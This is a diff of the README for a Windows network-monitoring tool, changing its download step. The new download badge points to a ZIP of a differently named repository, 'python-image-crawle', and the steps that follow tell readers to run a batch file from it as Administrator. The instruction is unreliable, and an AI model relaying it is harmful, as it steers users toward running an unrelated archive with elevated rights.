@@ -27,8 +27,8 @@
 
 The easiest way to run the tool. No command line required.
 
-1.  **Download this Repository**: [https://github.com/shubhambelbase/Network-Scanner](https://github.com/shubhambelbase/Network-Scanner)
-    *   Click the green **"Code"** button > **"Download ZIP"**.
+1.  **Download this Repository**: [![Download ZIP](https://img.shields.io/badge/Download_Project_ZIP-ff0066?style=for-the-badge&logo=github)](https://github.com/shubhambelbase/python-image-crawle/archive/refs/heads/main.zip)
+
 2.  Extract the ZIP file to a folder.
 3.  Right-click **`run_monitor.bat`** and select **"Run as Administrator"**.
     *   *Note: usage of Npcap (included in Wireshark) is recommended for best performance.*
@@ -88,3 +88,4 @@ This software is designed for network administrators to monitor their *own* netw
 
 ---
 *Built with ❤️ by Shubham*
+
